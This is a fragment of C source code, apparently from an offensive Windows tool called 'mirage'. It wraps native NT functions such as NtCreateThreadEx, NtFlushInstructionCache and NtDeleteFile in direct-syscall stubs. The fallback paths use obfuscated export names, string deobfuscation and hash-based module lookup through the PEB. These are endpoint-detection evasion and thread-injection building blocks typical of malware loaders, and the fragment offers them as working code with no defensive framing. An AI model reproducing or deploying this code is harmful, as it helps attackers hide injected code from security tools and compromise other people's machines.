NTSTATUS mirage_NtCreateThreadEx(HANDLE* a, ULONG b, PVOID c, HANDLE d, PVOID e, PVOID f, ULONG g, SIZE_T h, SIZE_T i, SIZE_T j, PVOID k) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtCreateThreadEx_stub((uint64_t)a,b,(uint64_t)c,(uint64_t)d,(uint64_t)e,(uint64_t)f,g,h,i,j,(uint64_t)k);
    }
    static pNtCreateThreadEx fn = NULL;
    if (!fn) fn = (pNtCreateThreadEx)resolve_export_obf(_NtCreateThreadEx_obf, sizeof(_NtCreateThreadEx_obf));
    return fn ? fn(a,b,c,d,e,f,g,h,i,j,k) : -1;
}

NTSTATUS mirage_NtFlushInstructionCache(HANDLE a, PVOID b, SIZE_T c) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtFlushInstructionCache_stub((uint64_t)a,(uint64_t)b,c);
    }
    static pNtFlushInstructionCache fn = NULL;
    if (!fn) fn = (pNtFlushInstructionCache)resolve_export_obf(_NtFlushInstructionCache_obf, sizeof(_NtFlushInstructionCache_obf));
    return fn ? fn(a,b,c) : -1;
}

NTSTATUS mirage_NtCreateEvent(HANDLE* a, ULONG b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtCreateEvent_stub((uint64_t)a,b,(uint64_t)c,d,e);
    }
    static pNtCreateEvent fn = NULL;
    if (!fn) fn = (pNtCreateEvent)resolve_export_obf(_NtCreateEvent_obf, sizeof(_NtCreateEvent_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

NTSTATUS mirage_NtDeleteFile(PVOID a) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtDeleteFile_stub((uint64_t)a);
    }
    static pNtDeleteFile fn = NULL;
    if (!fn) fn = (pNtDeleteFile)resolve_export_obf(_NtDeleteFile_obf, sizeof(_NtDeleteFile_obf));
    return fn ? fn(a) : -1;
}

NTSTATUS mirage_NtSetInformationFile(HANDLE a, PVOID b, PVOID c, ULONG d, ULONG e) {
    if (!g_use_fallback) {
        return (NTSTATUS)NtSetInformationFile_stub((uint64_t)a,(uint64_t)b,(uint64_t)c,d,e);
    }
    static pNtSetInformationFile fn = NULL;
    if (!fn) fn = (pNtSetInformationFile)resolve_export_obf(_NtSetInformationFile_obf, sizeof(_NtSetInformationFile_obf));
    return fn ? fn(a,b,c,d,e) : -1;
}

LONG mirage_NtUserGetSystemMetrics(ULONG nIndex) {
    if (!g_use_fallback) {
        return (LONG)(uint32_t)NtUserGetSystemMetrics_stub(nIndex);
    }
    /* Fallback: resolve GetSystemMetrics via PEB-walk */
    typedef int (WINAPI *pGetSystemMetrics)(int);
    static pGetSystemMetrics pGSM = NULL;
    if (!pGSM) {
        char dll[32];
        deobf_str(enc_user32, ENC_USER32_LEN, dll);
        void *u32 = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
        if (u32) {
            char fn[32];
            deobf_str(enc_GetSystemMetrics, ENC_GETSYSTEMMETRICS_LEN, fn);
            pGSM = (pGetSystemMetrics)mirage_get_function_by_hash(u32, mirage_encrypted_hash_func(fn));
        }
    }
    return pGSM ? (LONG)(uint32_t)pGSM(nIndex) : 0;
}
